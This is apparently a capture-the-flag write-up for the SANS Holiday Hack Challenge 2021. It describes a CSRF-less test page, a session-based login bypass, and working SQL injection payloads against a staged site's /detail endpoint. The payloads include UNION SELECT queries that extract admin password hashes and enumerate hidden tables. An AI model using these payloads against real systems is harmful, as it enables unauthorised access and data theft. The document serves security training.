# OBJECTIVE 12 - Frost Tower Website Checkup #

## OBJECTIVE : ##
>Investigate [Frost Tower's website for security issues](https://staging.jackfrosttower.com/). [This source code will be useful in your analysis](Assets/frosttower-web.zip). In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. 
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 12</summary>
  
>-  When you have the source code, API documentation becomes [tremendously](https://www.npmjs.com/package/express-session) [valuable](https://github.com/mysqljs/mysql).
</details>

#  

## PROCEDURE : ##

### 1. Getting Past the Splash Page ###

We start this challenge with access only to a “Coming Soon” splash-page with a text box that allows us to submit an email address.  From the hints I can guess that this objective will most likely involve SQLi so any fields that accept user input will be of particular interest, unfortunately the input to the text box is being validated in this case.  

I used [Atom](https://atom.io/) to load up the source code for the whole project and this allowed me to search through all the files and compare more easily.  I noticed that the “Coming Soon” splash-page had a hidden variable called `csrf` with a seemingly randomly-generated token value.  Other pages on the website check for this token to ensure that they are not accessed directly and that you can only visit them from other places on the website. 

By searching for the keyword `csrf` in the source code I noticed that there is one page that does not include this variable and that’s `/testsite`. In fact, I was able to enter the URL `https://staging.jackfrosttower.com/testsite` directly to my browser and access the staged website.

### 2. Auth Bypass ###

Once I was able to access the Jack Frost Tower website, I had access to the **‘About Us’**, **‘Services’** and **‘Contact Us’** pages but only the latter had any user input fields.  There is also a link to a *‘Dashboard login’/ but this requires login credentials which I don’t have (yet).

It took me several hours of staring at the source code and finally ended up solving this bit completely by accident!  If you submit a contact form and then try to re-submit with the same email address you get a message saying that the email already exists.  If you then navigate to `http://staging.jackfrosttower.com/dashboard` you are allowed in.  From what I can understand the `session.unique.ID` is set as `session.uniqueID = email` in the `/postcontact` part of the code.  The `/dashboard` part of the code then checks to see if this variable is set before allowing access to the dashboard page.

### 3. SQL Injection ###

Now that I had access to the Dashboard, I was able to view details and edit some fields for the users that registered on the *‘Contact Us’* pages.   I decided to start looking for a possible SQLi entry point.  I did this by searching the code for every instance where there is a `SELECT * FROM` statement in the code as this could be a potential SQLi entry point.  All the website parts I have access to appear to pass on sanitised user input to the `SELCT * FROM` operation by using the `escape()`[^1]  function.  
There is one exception however; the `/detail` page accepts a user id from the URI (eg. `https://staging.jackfrosttower.com/detail/1`) and passes the value on directly to `detail.ejs`[^2].  I can also pass on multiple comma-separated user ids (`…/detail/1,2,3`) and the page lists all of them.  So, this now looks like a very likely SQLi vulnerability.

*(NOTE: from here on the `https://staging.jackfrosttower.com/` part of the URI will be implied for ease of legibility).*

If I pass the following string, I can see a list of all entries in the `uniqeucontact` database.
```
.../detail/1,2 OR 1=1
```

I can also order the results by a particular column value – so this page is most definitely vulnerable to SQLi:
```
…/detail/1,2 OR 1=1 ORDER by email
```

With some luck[^3]  I was also able to get data from other tables including password hashes for the Admin and Super Admin users – this led me in the wrong direction for a while - it looks like it’s mostly useless to try and crack Bcrypt hashes.
```
.../detail/1,2 UNION SELECT * FROM users WHERE user_status=1 OR user_status=2
```

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/15699c8f-8ecf-4cd6-9ff7-e0a1e7be4e0d)

The biggest challenge I was facing at this point was the way in which the web page displays the data returned from the databases.  The `/detail` page is expecting to retrieve 7 fields of data from the table `uniqecontact`; `id`, `full_name`, `email`, `phone`, `country`, `date_created` and `date_update` (I can see this by looking at the source code and database structure).  So, I decided to try passing my own 7 fields to the SQL query to understand a bit better how the page is working.  To keep things simple, I passed seven fixed values from `11` to `77` and examined how these were displayed on the screen[^4].  I had to assign each value to a variable and use multiple `JOIN` commands to avoid using commas in my query (as these are being filtered): 
```
.../detail/1,2 UNION SELECT * FROM (SELECT 11)A JOIN (SELECT 22)B JOIN (SELECT 33)C JOIN (SELECT 44)D JOIN (SELECT 55)E JOIN (SELECT 66)F JOIN (SELECT 77)G;--
```

From the result of this query, I could tell that the page is displaying the 2nd, 3rd, 4th and 5th SELECT queries only, so I should be able to replace the `22`, `33`, `44` and `55` placeholders in my query with other values that are more interesting to me.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/502c967c-3b92-4e5e-a351-ce2ea4300ea6)


For example, I can see a list of names stored in the `users` table with the following query:
```
.../detail/1,2 UNION SELECT * FROM ((SELECT 11)A JOIN (SELECT name FROM users)B JOIN (SELECT 33)C JOIN (SELECT 44)D JOIN (SELECT 55)E JOIN (SELECT 66)F JOIN (SELECT 77)G);--
```

Since the objective’s question seems to be asking for a cleartext answer, it stands to reason that there must be some kind of text stored somewhere in the database that I can reference using SQLi.  Maybe there are more tables than those shown in the source code provided?  Let’s find out…
```
.../detail/1,2 UNION SELECT * FROM ((SELECT 11)A JOIN (SELECT table_name FROM information_schema.tables)B JOIN (SELECT 33)C JOIN (SELECT 44)D JOIN (SELECT 55)E JOIN (SELECT 66)F JOIN (SELECT 77)G);--
```

Sure enough – [those sneaky guys at SANS](https://www.sans.org/mlp/holiday-hack-challenge#Credits) included a fourth table called `todo` which was not included in the source code!  It would be useful to find out what columns it contains now:
```
.../detail/1,2 UNION SELECT * FROM ((SELECT 11)A JOIN (SELECT column_name FROM information_schema.columns WHERE table_name='todo')B JOIN (SELECT 33)C JOIN (SELECT 44)D JOIN (SELECT 55)E JOIN (SELECT 66)F JOIN (SELECT 77)G);--
```

From this query I now know that table `todo` contains the following columns: `id`, `note` and `completed`.  All that remains now is to have a peak at what’s inside `todo`:
```
.../detail/1,2 UNION SELECT * FROM ((SELECT 11)A JOIN (SELECT note FROM todo)B JOIN (SELECT 33)C JOIN (SELECT 44)D JOIN (SELECT 55)E JOIN (SELECT 66)F JOIN (SELECT 77)G);-- 
```

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2021/assets/60655500/ceb65c25-f088-40c0-9754-9b64b0061e82)

**And there we have it – proof that Jack Frost is an expert at adding insult to injury!!**

#  

[^1]:[https://github.com/mysqljs/mysql#escaping-query-values](https://github.com/mysqljs/mysql#escaping-query-values)
[^2]:I must point out that I have close to no experience in coding and even less so with web applications – so this is just how I *think* it might be working – but I definitely stand to be corrected.
[^3]:This query only works because the `users` table has the same number of columns as `uniquecontact` – so it’s only by sheer luck that I got this result
[^4]:Many thanks to **i81b4u#9510** on Discord for helping me reason this one out.
